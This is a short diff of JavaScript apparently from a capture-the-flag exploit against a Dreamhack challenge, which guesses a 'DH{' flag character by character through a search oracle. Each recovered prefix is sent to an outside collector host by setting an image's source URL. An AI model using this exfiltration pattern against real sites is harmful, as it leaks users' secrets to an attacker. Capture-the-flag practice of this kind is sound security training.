@@ -28,8 +28,8 @@
         let secret = "DH{";
         while (!secret.includes("}")) {
             for (let c of chars) {
-                if (await search(secret + c + 13)) {
-                    secret += c;
+                if (await search(secret + c)) {
+                    secret += (c+13);
                     img.src = `https://datyxax.request.dreamhack.games/${secret}`;
                     break;
                 }
